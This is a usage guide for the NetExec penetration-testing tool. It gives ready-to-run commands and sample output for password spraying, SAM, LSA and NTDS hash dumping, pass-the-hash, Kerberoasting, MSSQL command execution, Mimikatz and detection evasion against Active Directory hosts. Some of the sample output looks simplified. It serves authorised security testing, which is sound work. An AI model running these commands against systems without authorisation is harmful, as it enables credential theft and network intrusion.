# NetExec Documentation: Comprehensive Methods and Examples

## Overview
NetExec (nxc), previously known as CrackMapExec, is an open-source tool designed for automating network security assessments. It supports protocols like SMB, MSSQL, LDAP, WinRM, SSH, RDP, and more, enabling enumeration, credential validation, command execution, and exploitation tasks. This documentation provides a detailed guide to all major NetExec methods, their purposes, and practical examples, ensuring comprehensive coverage for penetration testers and security professionals. For the latest updates, refer to the official NetExec wiki at [https://www.netexec.wiki/](https://www.netexec.wiki/).

## Installation
To use NetExec on a Kali Linux system, follow these steps:

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

Verify installation and view supported protocols:
```bash
nxc -h
```
This displays the help menu, version (e.g., 1.4.0, codename: SmoothOperator), and available protocols (e.g., SMB, MSSQL, LDAP, WinRM, SSH, RDP).

## Core Methods and Examples
Below is a comprehensive list of NetExec methods, organized by functionality (enumeration, credential testing, exploitation, and post-exploitation). Examples assume a Kali Linux host targeting the `192.168.1.0/24` network or specific hosts (e.g., `192.168.1.100` for a domain controller, `192.168.1.126` for an MSSQL server, or `192.168.1.200` for an SSH server).

### 1. Host Enumeration
**Purpose**: Identify active hosts to map the network attack surface.

**Command**:
```bash
nxc smb 192.168.1.0/24
```
**Explanation**:
- Scans the subnet using SMB to detect live hosts, hostnames, domains, OS versions, and SMB configurations (e.g., signing, SMBv1 status).
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:example.com) (signing:True) (SMBv1:False)
  ```

**Use Case**: Initial reconnaissance to identify viable targets.

### 2. Null Session Enumeration
**Purpose**: Check for anonymous access to SMB services.

**Command**:
```bash
nxc smb 192.168.1.0/24 -u '' -p ''
```
**Explanation**:
- Attempts connections with empty credentials to identify hosts allowing null sessions.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\guest: (Pwn3d!)
  ```

**Use Case**: Discovers misconfigured systems exposing sensitive data without authentication.

### 3. Share Enumeration
**Purpose**: List SMB shares and their permissions.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'guest' -p '' --shares
```
**Explanation**:
- Enumerates shares using guest credentials, showing permissions (e.g., READ, WRITE).
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [*] Enumerated shares
  SMB         192.168.1.100 445 DC01 Share           Permissions     Remark
  SMB         192.168.1.100 445 DC01 -----           -----------     ------
  SMB         192.168.1.100 445 DC01 ADMIN$          Remote Admin
  SMB         192.168.1.100 445 DC01 C$              Default share
  SMB         192.168.1.100 445 DC01 IPC$            READ            Remote IPC
  SMB         192.168.1.100 445 DC01 NETLOGON        READ            Logon server share
  SMB         192.168.1.100 445 DC01 SYSVOL          READ            Logon server share
  ```

**Use Case**: Identifies accessible shares containing sensitive files.

### 4. Logged-on Users Enumeration
**Purpose**: Identify users with active sessions on a target.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --loggedon-users
```
**Explanation**:
- Requires valid credentials to list active user sessions.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Logged on users: example.com\user1, example.com\admin2
  ```

**Use Case**: Targets high-privilege accounts for privilege escalation.

### 5. Domain User Enumeration
**Purpose**: Retrieve Active Directory user accounts.

**Command**:
```bash
nxc ldap 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --users
```
**Explanation**:
- Queries Active Directory via LDAP for user accounts.
- Example output:
  ```
  LDAP        192.168.1.100 389 DC01 [+] example.com\administrator:P@ssw0rd
  LDAP        192.168.1.100 389 DC01 [*] Users: user1, user2, admin1
  ```

**Use Case**: Maps user accounts for password spraying or targeted attacks.

### 6. Domain Group Enumeration
**Purpose**: List domain or local groups and their members.

**Command**:
```bash
nxc ldap 192.168.1.100 -u 'user1' -p 'Password123' --groups
```
**Explanation**:
- Queries Active Directory for group memberships.
- Example output:
  ```
  LDAP        192.168.1.100 389 DC01 [+] example.com\user1:Password123
  LDAP        192.168.1.100 389 DC01 [*] Groups: Domain Admins (admin1, admin2), Domain Users (user1, user2)
  ```

**Use Case**: Identifies high-privilege groups for escalation paths.

### 7. Password Spraying
**Purpose**: Test a single password across multiple usernames to avoid lockouts.

**Command**:
```bash
nxc smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
```
**Explanation**:
- Uses a username list (`users.txt`) to test a password.
- Example `users.txt`:
  ```
  administrator
  user1
  user2
  ```
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:Password123 (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [-] example.com\user1:Password123 STATUS_LOGON_FAILURE
  ```

**Use Case**: Efficiently identifies valid credentials without triggering account lockouts.

### 8. Remote Command Execution
**Purpose**: Execute commands on a target system.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' -x 'whoami'
```
**Explanation**:
- Executes `whoami` via SMB with admin credentials.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [+] Executed command
  SMB         192.168.1.100 445 DC01 example.com\administrator
  ```

**PowerShell Example**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' -X 'Get-Process'
```
**Use Case**: Gathers system information or deploys payloads post-exploitation.

### 9. SAM Hash Dumping
**Purpose**: Extract local account hashes from the SAM database.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --sam
```
**Explanation**:
- Dumps SAM hashes for local accounts (requires admin privileges).
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Dumping SAM hashes
  SMB         192.168.1.100 445 DC01 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  ```

**Use Case**: Obtains hashes for offline cracking with tools like Hashcat.

### 10. LSA Secrets Dumping
**Purpose**: Extract sensitive data like cached credentials from LSA.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --lsa
```
**Explanation**:
- Dumps LSA secrets, potentially revealing plaintext credentials.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Dumping LSA secrets
  SMB         192.168.1.100 445 DC01 DefaultPassword:(user1:Password123)
  ```

**Use Case**: Recovers cached credentials for lateral movement.

### 11. Pass-the-Hash
**Purpose**: Authenticate using NTLM hashes instead of passwords.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'
```
**Explanation**:
- Uses an NTLM hash for authentication and executes a command.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator (Pwn3d!)
  SMB         192.168.1.100 445 DC01 example.com\administrator
  ```

**Use Case**: Bypasses password requirements with stolen hashes.

### 12. Session Enumeration
**Purpose**: List active SMB sessions to identify connected users.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --sessions
```
**Explanation**:
- Shows users connected via SMB and their source IPs.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Enumerated sessions
  SMB         192.168.1.100 445 DC01 user1 from 192.168.1.50
  ```

**Use Case**: Identifies active sessions for lateral movement planning.

### 13. NTDS Dumping
**Purpose**: Extract Active Directory data from the NTDS.dit file.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --ntds
```
**Explanation**:
- Dumps NTDS.dit using methods like `vss` or `drsuapi` (requires admin privileges).
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Dumping NTDS.dit
  SMB         192.168.1.100 445 DC01 [*] Saved to /home/user/.nxc/ntds_192.168.1.100.dit
  ```

**Use Case**: Obtains domain user hashes for offline cracking.

### 14. Kerberos Attacks
**Purpose**: Exploit Kerberos for hash extraction (Kerberoasting, ASREPRoast).

**Kerberoasting**:
```bash
nxc ldap 192.168.1.100 -u 'user1' -p 'Password123' --kerberoasting hash.txt
```
**Explanation**:
- Extracts SPN hashes for offline cracking.
- Example output:
  ```
  LDAP        192.168.1.100 389 DC01 [+] example.com\user1:Password123
  LDAP        192.168.1.100 389 DC01 [*] Kerberoasting hashes saved to hash.txt
  ```

**ASREPRoast**:
```bash
nxc ldap 192.168.1.100 -u 'user1' -p 'Password123' --asreproast hash.txt
```
**Explanation**:
- Targets accounts without Kerberos pre-authentication.
- Example output:
  ```
  LDAP        192.168.1.100 389 DC01 [+] example.com\user1:Password123
  LDAP        192.168.1.100 389 DC01 [*] ASREPRoast hashes saved to hash.txt
  ```

**Use Case**: Obtains crackable hashes for privilege escalation.

### 15. MSSQL Enumeration and Exploitation
**Purpose**: Enumerate and exploit Microsoft SQL Server instances.

**Password Spray**:
```bash
nxc mssql 192.168.1.126 -u 'sa' -p 'Password@123' --local-auth
```
**Explanation**:
- Tests credentials on an MSSQL server with local authentication.
- Example output:
  ```
  MSSQL       192.168.1.126 1433 SQL01 [+] sa:Password@123 (local auth)
  ```

**Database Query**:
```bash
nxc mssql 192.168.1.126 -u 'sa' -p 'Password@123' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```
**Explanation**:
- Lists databases on the MSSQL server.
- Example output:
  ```
  MSSQL       192.168.1.126 1433 SQL01 [+] sa:Password@123 (local auth)
  MSSQL       192.168.1.126 1433 SQL01 [*] Databases: master, tempdb, model, msdb
  ```

**Command Execution**:
```bash
nxc mssql 192.168.1.126 -u 'sa' -p 'Password@123' --local-auth -x 'whoami'
```
**Explanation**:
- Executes a system command via `xp_cmdshell`.
- Example output:
  ```
  MSSQL       192.168.1.126 1433 SQL01 [+] sa:Password@123 (local auth)
  MSSQL       192.168.1.126 1433 SQL01 [*] whoami: nt authority\system
  ```

**Use Case**: Automates MSSQL reconnaissance and exploitation.

### 16. RDP Enumeration
**Purpose**: Check RDP service availability and credentials.

**Command**:
```bash
nxc rdp 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --check
```
**Explanation**:
- Verifies RDP access and credential validity.
- Example output:
  ```
  RDP         192.168.1.100 3389 DC01 [+] example.com\administrator:P@ssw0rd
  RDP         192.168.1.100 3389 DC01 [*] RDP enabled, authentication successful
  ```

**Use Case**: Identifies systems with RDP enabled for potential remote access.

### 17. SSH Enumeration and Command Execution
**Purpose**: Enumerate and interact with SSH services.

**Command**:
```bash
nxc ssh 192.168.1.200 -u 'root' -p 'toor' -x 'whoami'
```
**Explanation**:
- Tests SSH credentials and executes a command.
- Example output:
  ```
  SSH         192.168.1.200 22 SERVER [+] root:toor
  SSH         192.168.1.200 22 SERVER [*] whoami: root
  ```

**Use Case**: Automates SSH-based attacks on Linux/Unix systems.

### 18. Mimikatz Credential Dumping
**Purpose**: Extract credentials from memory using Mimikatz.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' -M mimikatz
```
**Explanation**:
- Runs Mimikatz to extract credentials from LSASS.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Mimikatz output: user1:Password123
  ```

**Use Case**: Retrieves plaintext credentials with admin access.

### 19. Group Policy Preferences (GPP) Passwords
**Purpose**: Extract plaintext credentials from GPP files.

**Command**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' --gpp-passwords
```
**Explanation**:
- Searches SYSVOL for GPP XML files with encrypted passwords.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Found GPP password: svc_account:Passw0rd!
  ```

**Use Case**: Exploits outdated GPP configurations for credential recovery.

### 20. Using Modules
**Purpose**: Extend functionality with protocol-specific modules.

**Listing Modules**:
```bash
nxc smb -L
```
**Explanation**:
- Lists available modules (e.g., `spider_plus`, `met_inject`, `wdigest`).

**Example: Spidering Shares**:
```bash
nxc smb 192.168.1.100 -u 'administrator' -p 'P@ssw0rd' -M spider_plus -o DOWNLOAD_FLAG=True
```
**Explanation**:
- Searches shares for files and downloads them if `DOWNLOAD_FLAG=True`.
- Example output:
  ```
  SMB         192.168.1.100 445 DC01 [+] example.com\administrator:P@ssw0rd (Pwn3d!)
  SMB         192.168.1.100 445 DC01 [*] Spidering shares...
  SMB         192.168.1.100 445 DC01 [*] Found files: /SHARE1/config.ini, /SHARE1/secret.txt
  ```

**Use Case**: Identifies sensitive files in shares.

### 21. Database Interaction with `nxcdb`
**Purpose**: Manage stored results in NetExec’s database.

**Command**:
```bash
nxcdb
```
**Explanation**:
- Accesses the database in `~/.nxc/workspaces`.
- Example commands:
  ```bash
  nxcdb (default)(smb) > creds
  nxcdb (default)(smb) > export creds detailed credentials.txt
  ```
- Lists or exports stored credentials.

**Use Case**: Organizes results from large-scale assessments.

## Advanced Techniques
- **Kerberos Authentication**: Use `-k` for Kerberos-based authentication:
  ```bash
  nxc smb 192.168.1.100 -u 'user1' -p 'Password123' -k
  ```
- **Brute-Force Control**: Use `--no-bruteforce` to test specific credential pairs:
  ```bash
  nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
  ```
- **Module Options**: Specify options with `-o` (e.g., `READ_ONLY=False` for `spider_plus`).
- **Jitter and Evasion**: Add delays with `--jitter INTERVAL` to evade detection.

## Best Practices
- **Verbose Logging**: Use `--verbose` or `--debug` for troubleshooting.
- **Output Export**: Save results with `--log output.log`.
- **Thread Control**: Adjust concurrency with `-t THREADS` (e.g., `-t 10`).
- **Credential Handling**: Use single quotes for special characters (e.g., `-u '!user'`).
- **Workspace Management**: Use `nxcdb` to organize results across engagements.

## Notes on Completeness
NetExec’s modular design means new modules may be added. To explore all modules:
```bash
nxc <protocol> -L
```
Check the GitHub repository (https://github.com/Pennyw0rth/NetExec) for updates or custom modules.

## References
- Official NetExec Wiki: [https://www.netexec.wiki/](https://www.netexec.wiki/)
- GitHub Repository: [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
- Hacking Articles: [https://www.hackingarticles.in/](https://www.hackingarticles.in/)